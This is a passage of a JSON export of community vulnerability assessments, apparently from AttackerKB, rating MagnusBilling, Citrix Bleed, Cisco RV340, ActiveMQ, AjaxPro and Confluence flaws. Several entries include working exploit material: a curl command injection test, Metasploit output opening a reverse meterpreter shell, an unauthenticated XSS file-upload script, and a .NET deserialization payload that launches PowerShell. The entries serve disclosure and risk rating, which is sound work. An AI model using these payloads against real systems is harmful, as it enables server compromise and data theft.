          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "0edd3920-b415-4b8b-a65c-d01384b5c581",
      "editorId": "8a465efa-5959-4307-868a-5c6bd2f9fdc9",
      "topicId": "cd97b58f-ff67-4fce-8e38-75b53136db49",
      "created": "2023-10-24T12:59:23.528043Z",
      "revisionDate": "2023-10-31T09:43:59.969645Z",
      "document": "`MagnusBilling` is an open source tool written in `PHP` and `JAVASCRIPT`, using the `EXTJS 6` and `YII FRAMEWORK` frameworks, aimed at IP telephony providers. It provides a complete and powerful system for anyone to start an IP telephony provider.\r\n\r\nUnfortunately a command injection vulnerability exists in `MagnusBilling` versions 6 and 7. The vulnerability allows an unauthenticated user to execute arbitrary OS commands on the host, with the privileges of the web server. This is caused by a piece of demonstration code which is present in `lib/icepay/icepay.php`, with a call to `exec()` at line 753. The parameter to `exec()` includes the `GET` parameter `democ`, which is controlled by the user.\r\n\r\n```php\r\nif (isset($_GET['demo'])) {\r\n\r\n    if ($_GET['demo'] == 1) {\r\n        exec(\"touch idepay_proccess.php\");\r\n    } else {\r\n        exec(\"rm -rf idepay_proccess.php\");\r\n    }\r\n}\r\nif (isset($_GET['democ'])) {\r\n    if (strlen($_GET['democ']) > 5) {\r\n/** begin vulnerable code **/\r\n        exec(\"touch \" . $_GET['democ'] . '.txt');\r\n/** end vulnerable code **/\r\n    } else {\r\n        exec(\"rm -rf *.txt\");\r\n    }\r\n}\r\n```\r\nAn unauthenticated user is able to execute arbitrary OS commands. The commands run with the privileges of the web server process, typically `www-data` or `asterisk`. At a minimum, this allows an attacker to compromise the billing system and its database.\r\n\r\nYou can simply test the vulnerability launching a `curl` request issuing a blind command injection using a `sleep` command, lets say 15 seconds.\r\n`Curl` will take approximately 15 seconds to return if the target is vulnerable.\r\n\r\n```shell\r\ncurl 'http://192.168.201.31/mbilling/lib/icepay/icepay.php?democ=iamhacked;sleep%2015;#'\r\n```\r\nA `shodan` search with dork `http.html:\"magnusbilling\"` still shows a significant amount of instances (2200+) that are accessible from the Public Internet from which at least 30%-40% is still vulnerable at the time of writing.\r\n\r\nI have created a Metasploit module that checks the vulnerability of a target and makes use of the vulnerability to exploit the target. It allows you to choose from different target options such as deploying and launching an obfuscated `PHP` webshell, performing a `UNIX` command injection or launching native `Linux Meterpreter`.\r\n\r\n## Module in action\r\n```shell\r\nmsf6 exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > info\r\n\r\n       Name: Magnusbilling application unauthenticated Remote Command Execution.\r\n     Module: exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258\r\n   Platform: PHP, Unix, Linux\r\n       Arch: php, cmd, x64, x86\r\n Privileged: Yes\r\n    License: Metasploit Framework License (BSD)\r\n       Rank: Excellent\r\n  Disclosed: 2023-06-26\r\n\r\nProvided by:\r\n  h00die-gr3y <h00die.gr3y@gmail.com>\r\n  Eldstal\r\n\r\nModule side effects:\r\n ioc-in-logs\r\n artifacts-on-disk\r\n\r\nModule stability:\r\n crash-safe\r\n\r\nModule reliability:\r\n repeatable-session\r\n\r\nAvailable targets:\r\n      Id  Name\r\n      --  ----\r\n  =>  0   PHP\r\n      1   Unix Command\r\n      2   Linux Dropper\r\n\r\nCheck supported:\r\n  Yes\r\n\r\nBasic options:\r\n  Name       Current Setting         Required  Description\r\n  ----       ---------------         --------  -----------\r\n  Proxies                            no        A proxy chain of format type:host:port[,type:host:port][...]\r\n  RHOSTS     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics\r\n                                               /using-metasploit.html\r\n  RPORT      80                      yes       The target port (TCP)\r\n  SSL        false                   no        Negotiate SSL/TLS for outgoing connections\r\n  SSLCert                            no        Path to a custom SSL certificate (default is randomly generated)\r\n  TARGETURI  /mbilling               yes       The MagnusBilling endpoint URL\r\n  URIPATH                            no        The URI to use for this exploit (default is random)\r\n  VHOST                              no        HTTP server virtual host\r\n\r\n\r\n  When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:\r\n\r\n  Name     Current Setting  Required  Description\r\n  ----     ---------------  --------  -----------\r\n  SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local ma\r\n                                      chine or 0.0.0.0 to listen on all addresses.\r\n  SRVPORT  8080             yes       The local port to listen on.\r\n\r\n\r\n  When TARGET is 0:\r\n\r\n  Name      Current Setting  Required  Description\r\n  ----      ---------------  --------  -----------\r\n  WEBSHELL                   no        The name of the webshell with extension. Webshell name will be randomly generated if left\r\n                                       unset.\r\n\r\nPayload information:\r\n\r\nDescription:\r\n  A Command Injection vulnerability in magnusbilling application 6.x and 7.x allows\r\n  remote attackers to run arbitrary commands via unauthenticated HTTP request.\r\n  A piece of demonstration code is present in `lib/icepay/icepay.php`, with a call to an exec().\r\n  The parameter to exec() includes the GET parameter `democ`, which is controlled by the user and\r\n  not properly sanitised/escaped.\r\n  After successful exploitation, an unauthenticated user is able to execute arbitrary OS commands.\r\n  The commands run with the privileges of the web server process, typically `www-data` or `asterisk`.\r\n  At a minimum, this allows an attacker to compromise the billing system and its database.\r\n\r\n  The following magnusbilling applications are vulnerable:\r\n  - Magnusbilling application version 6 (all versions);\r\n  - Magnusbilling application up to version 7.x without commit 7af21ed620 which fixes this vulnerability;\r\n\r\nReferences:\r\n  https://nvd.nist.gov/vuln/detail/CVE-2023-30258\r\n  https://attackerkb.com/topics/DFUJhaM5dL/cve-2023-30258\r\n  https://eldstal.se/advisories/230327-magnusbilling.html\r\n\r\n\r\nView the full module info with the info -d command.\r\n```\r\n### Example using the PHP target option\r\n```shell\r\nmsf6 exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > set rhosts 192.168.201.31\r\nrhosts => 192.168.201.31\r\nmsf6 exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > exploit\r\n\r\n[*] Started reverse TCP handler on 192.168.201.8:4444\r\n[*] Running automatic check (\"set AutoCheck false\" to disable)\r\n[*] Checking if 192.168.201.31:80 can be exploited.\r\n[*] Performing command injection test issuing a sleep command of 5 seconds.\r\n[*] Elapsed time: 5.1 seconds.\r\n[+] The target is vulnerable. Successfully tested command injection.\r\n[*] Executing PHP for php/meterpreter/reverse_tcp\r\n[*] Sending stage (39927 bytes) to 192.168.201.31\r\n[+] Deleted LfsCVIttNL.php\r\n[*] Meterpreter session 3 opened (192.168.201.8:4444 -> 192.168.201.31:46230) at 2023-10-24 10:26:47 +0000\r\n\r\nmeterpreter > getuid\r\nServer username: asterisk\r\nmeterpreter > sysinfo\r\nComputer    : debian\r\nOS          : Linux debian 6.1.0-13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.55-1 (2023-09-29) x86_64\r\nMeterpreter : php/linux\r\nmeterpreter >\r\n```\r\nYou can find the module [here](https://github.com/h00die-gr3y/Metasploit/blob/main/magnusbilling_unauth_rce_cve_2023_30258.rb) in my local repository or as [PR 18481](https://github.com/rapid7/metasploit-framework/pull/18481) at the Metasploit Github development.\r\n\r\n### Mitigation\r\nYou should update your `MagnusBilling` application  to the latest version or remove the vulnerable code from the file `lib/icepay/icepay.php` under the `mbilling` directory at your web server root.\r\n\r\n### References\r\n[CVE-2023-30258](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-30258)\r\n[Security Advisory](https://eldstal.se/advisories/230327-magnusbilling.html)\r\n[MagnusBilling Unauthenticated RCE - h00die-gr3y Metasploit local repository](https://github.com/h00die-gr3y/Metasploit/blob/main/magnusbilling_unauth_rce_cve_2023_30258.rb)\r\n[MagnusBilling Unauthenticated RCE - Metasploit PR 18481](https://github.com/rapid7/metasploit-framework/pull/18481)\r\n[MagnusBilling 7](https://github.com/magnussolution/magnusbilling7)\r\n[MagnusBilling 6](https://github.com/magnussolution/magnusbilling6)\r\n\r\n\r\n### Credits\r\n* `eldstal.se`  discovery of the vulnerability\r\n",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "e85f5cd8-8d36-4bca-9261-a520a8b7aa6b",
      "editorId": "dadd7295-ffae-449d-ba22-0a6feefa6f67",
      "topicId": "d8e734ae-4f21-421d-8b1c-b6c876027a59",
      "created": "2023-10-24T18:01:42.433646Z",
      "revisionDate": "2024-02-02T20:15:20.170176Z",
      "document": "On October 10, 2023, Citrix posted [an advisory](https://support.citrix.com/article/CTX579459/netscaler-adc-and-netscaler-gateway-security-bulletin-for-cve20234966-and-cve20234967) about a high-risk vulnerability in Citrix ADC, which affects the following versions:\r\n\r\n* NetScaler ADC and NetScaler Gateway\u202f14.1\u202fbefore\u202f14.1-8.50\r\n* NetScaler ADC and NetScaler Gateway\u202f13.1\u202fbefore\u202f13.1-49.15\r\n* NetScaler ADC and NetScaler Gateway\u202f13.0\u202fbefore 13.0-92.19\r\n* NetScaler ADC 13.1-FIPS before 13.1-37.164\r\n* NetScaler ADC 12.1-FIPS before 12.1-55.300\r\n* NetScaler ADC 12.1-NDcPP before 12.1-55.300\r\n\r\nAssetnote coined this as [Citrixbleed](https://www.assetnote.io/resources/research/citrix-bleed-leaking-session-tokens-with-cve-2023-4966) when they released their research on it. Basically, it lets you steal session tokens (and other data from memory). It's been added to KEV based on Citrix's [statement](https://www.netscaler.com/blog/news/cve-2023-4966-critical-security-update-now-available-for-netscaler-adc-and-netscaler-gateway/).\r\n\r\nThe vulnerability itself is subtle, and is due to misusing a C API function (as so many vulns are). The following disassembled code is used as part of the OpenID response:\r\n\r\n```c\r\niVar3 = snprintf(print_temp_rule,0x20000, \"{\\\"issuer\\\": \\\"https://%.*s\\\", \\\"authorization_endpoint\\\": \\\"https://%.*s/oauth/ idp/login\\\", \\\"token_endpoint\\\": \\\"https://%.*s/oauth/idp/token\\\", \\\"jwks_uri\\\": \\\"https://%.*s/oauth/idp/certs\\\", \\\"response_types_supported\\\": [\\\"code\\\", \\\"toke n\\\", \\\"id_token\\\"], \\\"id_token_signing_alg_values_supported\\\": [\\\"RS256\\\"], \\\"end _session_endpoint\\\": \\\"https://%.*s/oauth/idp/logout\\\", \\\"frontchannel_logout_sup ported\\\": true, \\\"scopes_supported\\\": [\\\"openid\\\", \\\"ctxs_cc\\\"], \\\"claims_support ed\\\": [\\\"sub\\\", \\\"iss\\\", \\\"aud\\\", \\\"exp\\\", \\\"iat\\\", \\\"auth_time\\\", \\\"acr\\\", \\\"amr \\\", \\\"email\\\", \\\"given_name\\\", \\\"family_name\\\", \\\"nickname\\\"], \\\"userinfo_endpoin t\\\": \\\"https://%.*s/oauth/idp/userinfo\\\", \\\"subject_types_supported\\\": [\\\"public\\\"]}\" ,uVar5,pbVar8,uVar5,pbVar8,uVar5,pbVar8,uVar5,pbVar8,uVar5,pbVar8,uVar5,pbVar8); authv2_json_resp = 1; iVar3 = ns_vpn_send_response(param_1,0x100040,print_temp_rule,iVar3);\r\n```\r\n\r\nIt uses the `snprintf()` function, which returns the number of bytes the call _wants_ to write to the buffer, not the number of bytes it _actually_ writes to the buffer; from the manpage `printf(3)`:\r\n\r\n> The functions `snprintf()` and `vsnprintf()` do not write more than size bytes (including the terminating null byte ('\\0')). If the output was truncated due to this limit, then the return value is the number of characters (excluding the terminating null byte) which would have been written to the final string if enough space had been available. Thus, a return value of size or more means that the output was truncated\r\n\r\nThat length value - which can be longer than the size of the buffer - is used when sending a reply. That means that if the desired string is more than 0x20000 bytes long, it will respond with memory after the end of the buffer, which includes session tokens.",
      "score": 6,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "19076e68-1c52-48c1-bc15-7f6a3053c357",
          "name": "CISA KEV Listed",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "cisa_kev_listed"
        },
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "d702ddfa-63be-4507-acf0-7f25987d2bd4",
      "editorId": "e28f53e6-cf6f-4b91-89be-6cb19dfd4315",
      "topicId": "d8547c38-28e7-4646-ae6a-3c5505749d77",
      "created": "2023-10-26T17:36:07.707687Z",
      "revisionDate": "2023-10-26T17:36:07.703534Z",
      "document": "An unauthorised File Upload (XSS) Vulnerability security flaw has been identified in the web-based management interface of Cisco RV340, RV340W, RV345, and RV345P Dual WAN Gigabit VPN Routers. \r\n\r\nThis vulnerability may permit an attacker, who is not authenticated and operates remotely, to upload any file of their choice to a compromised device. The root cause of this vulnerability lies in the inadequacy of authorization enforcement mechanisms related to file uploads. \r\n\r\nTo exploit this flaw, an attacker could dispatch a meticulously crafted HTTP request to a vulnerable device. A successful exploitation of this vulnerability could empower the attacker to upload unrestricted files to the compromised device.\r\n\r\nTest script:\r\n\r\n#!/usr/bin/bash\r\nTARGET=\"https://x.x.x.x\"; \\\r\nFILENAME=\"login.html\"; \\\r\n<script>alert('XSS Test')</script>\" > $FILENAME; \\\r\ncurl -ksX POST \"$TARGET/api/operations/ciscosb-file:form-file-upload\" -H \"Authorization: 1\" -F \"pathparam=Portal\" -F \"fileparam=${FILENAME}\" -F \"file.path=${FILENAME}\" -F \"file=@${FILENAME};type=application/octet-stream\"; \\\r\n",
      "score": 1,
      "metadata": {
        "attacker-value": 1,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        }
      ]
    },
    {
      "id": "f0dd45e2-a0f0-4b00-8c72-ae318fc58df1",
      "editorId": "e28f53e6-cf6f-4b91-89be-6cb19dfd4315",
      "topicId": "a7f7deaa-205f-44a8-aa0a-10cf47185f0b",
      "created": "2023-10-30T08:14:00.583431Z",
      "revisionDate": "2023-10-30T08:14:00.58313Z",
      "document": "The vulnerability centers around the capability of Microsoft.Exchange.DxStore.Common.DxSerializationUtil.SharedTypeResolver to bypass system checks. \r\n\r\nThis vulnerability is exploited by leveraging the Microsoft.Exchange.DxStore.Common.DxSerializationUtil.SharedTypeResolver class to evade the .NET Framework's default security restrictions. This class can be employed to load assemblies from remote locations, subsequently enabling the execution of arbitrary code on the victim's system.\r\n\r\nTo exploit this vulnerability, an attacker must first gain LAN access to the victim's Exchange server. Once this access is obtained, the attacker can send a specially crafted HTTP request to the server, triggering the exploitation of the vulnerability. If successful, the attacker gains the ability to execute arbitrary code on the victim's system.\r\n\r\nSecurity researcher N1k0la publicly disclosed the issue and shared a PoC of this vulnerability.",
      "score": 1,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "17fdfb85-8dfd-4dbf-bd2b-7cd032026885",
          "name": "Requires physical access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_exploit"
        }
      ]
    },
    {
      "id": "803eaf7f-d1ea-444d-b6e3-237391038335",
      "editorId": "e28f53e6-cf6f-4b91-89be-6cb19dfd4315",
      "topicId": "f70e2cb4-0ce2-4c25-b213-d24e541c5c82",
      "created": "2023-11-01T06:51:52.907495Z",
      "revisionDate": "2023-11-01T06:51:52.908262Z",
      "document": "CISA KEV listed",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "19076e68-1c52-48c1-bc15-7f6a3053c357",
          "name": "CISA KEV Listed",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "cisa_kev_listed"
        },
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "7a37f0d4-64c5-474e-b3d9-5db6fbe100f3",
      "editorId": "e28f53e6-cf6f-4b91-89be-6cb19dfd4315",
      "topicId": "af8ebc70-23b1-472b-907f-6a347f26f2ff",
      "created": "2023-11-01T06:54:11.073566Z",
      "revisionDate": "2023-11-01T06:54:11.074028Z",
      "document": "CISA KEV listed",
      "score": 1,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "19076e68-1c52-48c1-bc15-7f6a3053c357",
          "name": "CISA KEV Listed",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "cisa_kev_listed"
        },
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "0e696d6d-665a-48bd-9636-06d0a3a2a211",
          "name": "Requires elevated access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_elevated_access"
        }
      ]
    },
    {
      "id": "c0d9db70-2459-4dc7-911c-790af59229b9",
      "editorId": "d603b493-1c7b-4ee8-972f-185269cce6d3",
      "topicId": "fa462bf2-4fb6-4fd0-96f0-cee042e36717",
      "created": "2023-11-01T16:04:24.3566Z",
      "revisionDate": "2024-02-01T15:08:12.833632Z",
      "document": "Based upon analyzing the public exploit and the root cause of the vulnerability, I have rated the exploitability as very high as this vuln is unauthenticated and is trivial to exploit with the [public exploit](https://github.com/X1r0z/ActiveMQ-RCE). The attacker value is high as this service is used in enterprise environments, Shadowserver  reports over [3000 vulnerable instances](https://www.shadowserver.org/what-we-do/network-reporting/accessible-activemq-service-report/) online as of Oct 30, 2023",
      "score": 3,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "335fda54-58b3-42bd-b258-5ce15fdbaf33",
      "editorId": "de2686f1-1a8a-4518-8379-12188d859523",
      "topicId": "af11b0f1-11a7-4a56-89db-506d144c7e72",
      "created": "2023-11-02T20:14:26.550491Z",
      "revisionDate": "2023-11-02T21:27:50.971775Z",
      "document": "Ajax.NET Professional better known as AjaxPro is an AJAX framework available for Microsoft ASP.NET. At the time of discovery of this deserialization RCE vulnerability, there were approximately 30,000 instances of AjaxPro in use. \u201cWoah, scary! So many vulnerable instances\u201d one might say, however do not be alarmed, this vulnerability is quite difficult to exploit.\r\n\r\nVulnerable versions (versions prior to `21.10.30.1`) contain example classes which demonstrate how you might implement the functionality of AjaxPro. These classes are not actually used by the framework. However one class in particular, the \u201cICartService\u201d demonstrates how to construct a configuration which is vulnerable to this deserialization vulnerability. \r\n```\r\n 1 namespace AjaxPro.Services\r\n 2{\r\n 3\t[AjaxNamespace(\"AjaxPro.Services.Cart\")]\r\n 4\tpublic abstract class ICartService\r\n 5\t{\r\n 6        /// <summary>\r\n 7        /// Adds the item.\r\n 8        /// </summary>\r\n 9        /// <param name=\"cartName\">Name of the cart.</param>\r\n10        /// <param name=\"item\">The item.</param>\r\n11        /// <returns></returns>\r\n12\t\t[AjaxMethod]\r\n13\t\tpublic abstract bool AddItem(string cartName, object item);\r\n14\r\n15        /// <summary>\r\n16        /// Gets the items.\r\n17        /// </summary>\r\n18        /// <param name=\"cartName\">Name of the cart.</param>\r\n19        /// <returns></returns>\r\n20\t\t[AjaxMethod]\r\n21\t\tpublic abstract object[] GetItems(string cartName);\r\n22\t}\r\n23}\r\n```\r\n\r\nIf this example were to be hosted by the application it would allow us to gain remote code execution by sending the following get request:\r\n```\r\nPOST /ajaxpro/AjaxPro.Services.ICartService,AjaxPro.2.ashx HTTP/1.1\r\nHost: localhost\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15\r\nX-AjaxPro-Method: AddItem\r\nContent-Type: text/plain; charset=utf-8\r\nContent-Length: 4670\r\n\r\n{\"item\":{\"__type\":\"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\",\"MethodName\":\"Start\",\"ObjectInstance\":{\"__type\":\"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\",\"StartInfo\":{\"__type\":\"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\",\"FileName\":\"cmd\",\"Arguments\":\"/c powershell.exe <insert payload here>\"}}}}\r\n```\r\n\r\nIt is important to note what parameters in the codebase the attacker needs to be privy to in order to exploit this vulnerability as it is unlikely an origination would go out of its way to host this specific example. In order to exploit the attacker needs to know:\r\n\r\n1. The `Namespace`, which is hosting the vulnerable Ajax Method.\r\n2. The `Method` name, which is sent in the `X-AjaxPro-Method` header.\r\n3. The `Object` name, which contains the payload that gets passed to the vulnerable deserialization.\r\n\r\nEvery vulnerable instance of AjaxPro will implement the three above parameters differently depending on what the application designed to do, unless of course the developers lazily copy and pasted this example without changing a thing which is possible. Take for example, this application which was built by [@numanturle](https://github.com/numanturle/CVE-2021-23758-POC/tree/main) specifically for demonstrating this vulnerability:\r\n```\r\nnamespace CVE_2021_23758_POC\r\n{\r\n    public partial class demo : System.Web.UI.Page\r\n    {\r\n        protected void Page_Load(object sender, EventArgs e)\r\n        {\r\n            AjaxPro.Utility.RegisterTypeForAjax(typeof(demo));\r\n        }\r\n\r\n        [AjaxPro.AjaxMethod]\r\n        public static String TestAjax(Object obj)\r\n        {\r\n            UserInfo u = obj as UserInfo;\r\n            return u.Name;\r\n        }\r\n    }\r\n}\r\n```\r\nSee how the `Namespace` (CVE_2021_23758_POC), `Method` (TestAjax) and `Object` (obj) are all different and application specific. This vulnerability is not feasibly exploitable from a black box perspective, you need information about how the vulnerable code has been implemented - this is reflected in the Attacker Value and exploitability ratings. \r\n\r\n# References\r\nhttps://github.com/numanturle/CVE-2021-23758-POC/tree/main\r\nhttps://github.com/michaelschwarz/Ajax.NET-Professional/\r\nhttps://github.com/rapid7/metasploit-framework/pull/18494\r\nhttps://mogwailabs.de/en/blog/2022/01/vulnerability-spotlight-rce-in-ajax.net-professional/",
      "score": 1,
      "metadata": {
        "attacker-value": 1,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        }
      ]
    },
    {
      "id": "200a93a3-302c-4d88-9336-74522d69d3b6",
      "editorId": "e28f53e6-cf6f-4b91-89be-6cb19dfd4315",
      "topicId": "fa462bf2-4fb6-4fd0-96f0-cee042e36717",
      "created": "2023-11-03T09:48:54.171199Z",
      "revisionDate": "2024-07-26T19:49:41.164484Z",
      "document": "CISA KEV Listed as of 11/02/2023\r\n\r\nA July 2024 bulletin from multiple U.S. government agencies indicates that North Korean state-sponsored attackers have demonstrated interest in this vulnerability \u2014 not immediately clear whether it was exploited or just used in reconnaissance/target selection: https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-207a",
      "score": 1,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "991a0301-5049-4e43-86af-feec9914e03a",
          "name": "Observed in State-sponsored attacks",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "observed_in_state_sponsored_attacks"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "8ba07102-959e-4f0b-93fe-1ca68e9a9756",
      "editorId": "e28f53e6-cf6f-4b91-89be-6cb19dfd4315",
      "topicId": "b9b1ac9a-9261-45cf-bea4-a10d76960c24",
      "created": "2023-11-06T15:53:12.598964Z",
      "revisionDate": "2023-11-10T10:00:42.508793Z",
      "document": "Rapid7 observed as of November 5, 2023, exploitation of Atlassian Confluence in multiple customer environments, including for ransomware deployment. ",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "19076e68-1c52-48c1-bc15-7f6a3053c357",
          "name": "CISA KEV Listed",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "cisa_kev_listed"
        },
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "def6357c-0771-400a-909d-2021d9f6b227",
          "name": "Observed in ransomware attacks",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "observed_in_ransomware"
        }
      ]
    },
    {
      "id": "5cc9b7f1-e0c4-45f7-a3ad-40de89235344",
      "editorId": "e28f53e6-cf6f-4b91-89be-6cb19dfd4315",
      "topicId": "4f83c3b2-dcca-4e55-bb6b-4235da81750f",
      "created": "2023-11-09T14:50:00.733093Z",
      "revisionDate": "2023-11-10T10:00:37.548933Z",
